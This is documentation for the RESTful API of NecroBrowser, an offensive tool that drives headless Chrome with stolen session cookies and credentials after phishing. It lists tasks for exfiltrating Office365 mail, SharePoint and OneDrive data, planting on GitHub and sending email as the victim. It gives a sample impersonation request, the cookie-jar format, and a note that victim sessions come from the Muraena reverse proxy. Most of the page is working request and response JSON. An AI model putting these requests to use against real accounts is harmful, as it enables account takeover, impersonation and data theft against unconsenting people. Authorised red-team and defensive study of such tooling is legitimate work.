---
layout: default
title: RESTful API
permalink: /api
nav_order: 4
has_children: true
has_toc: true
---

# RESTful API

Necrobrowser is a microservice that exposes the following RESTful API:

## GET `/`

Returns the status of the NecroBrowser cluster, showing generic information about queue size and processed tasks.
```json
{ 
  "startedAt":"2020-11-27 16:38:47",
  "workers":"0",  
  "queued":"0",
  "progress":"0 / 0 (100.00%)",
  "errors":"0 (0.00%)",
  "tasks":[]
}
```

## GET `/tasks`
Returns the available Task types and their exposed methods.

```json
{
"github":[
   "PlantAndDump"
 ],
"gsuite":[
   "ScreenshotApps"
 ],
"office365":[
   "ScreenshotApps",
   "SharepointExtrude",
   "OneDriveExtrude",
   "OutlookWriteEmail",
   "OutlookExtrude"
  ]
}
```

## POST `/instrument`

Queue the specified instrumentation task spawning a dedicated Chrome headless instance.
Let's say we want to trigger the office365.OutlookWriteEmail task. We would use a POST body like the following:

```json
 {
  "name": "NecroTest",
  "task": {
      "type": "office365",
      "name": "OutlookWriteEmail",
      "params": {
         "fixSession": "https://outlook.office.com/mail/inbox",
         "writeEmail": {
            "to": "WikiInternal@ogre.onmicrosoft.com",
            "subject": "All your sessions are belong to us",
            "data": "NecroBrowser is impersonating this user.\nBye",
            "attachment": "./testing/attachment.png"
          }
      }
    }, 
  "cookies": [
    {...}
  ], 
  "credentials": [
    {...}
  ]
}
```

The POST returns immediately the queued job id as the following, while the task is queued into the cluster:

```json
{
    "status":"queued",
    "necroId":"task:office365:Q8FAt0bGZ"
}
```

The `necroId` can be used to poll the task details via GET `/instrument/<necroId>` until the task status is completed.
Note that since the instrumentation activity is asynchronous, when long-running tasks save intermediate data to the database,
that data is immediately accessible from the API. So, depending on your needs, you might want to poll less or more frequently
the instrument handler depending on your needs.

Cookies need to be specified as an array of JSON objects with the following structure:

```json
"cookies":[
    {
        "domain": ".github.com",
        "expirationDate": 1664018069,
        "hostOnly": false,
        "httpOnly": false,
        "name": "_ga",
        "path": "/",
        "sameSite": "unspecified",
        "secure": false,
        "session": false,
        "storeId": "0",
        "value": "GA1.2.26244907.1600769408",
        "id": 1
    },
    {
     ... 
    }
]
```

To quickly export all page cookies from a logged session, on Chrome the 
[EditThisCookie](https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg) extension 
can be used. This is useful when developing/testing new necro modules.

However, in real-world scenarios, when NecroBrowser is used together with Muraena,
the victim credentials and full cookiejar are automatically received from the Muraena reverse proxy.


## GET  `/instrument/:id`

Returns instrumentation status and output, for example scraped web pages data, images or files.
The JSON output keys vary depending on the necrotask used,
but in general they are stored as maps of strings.
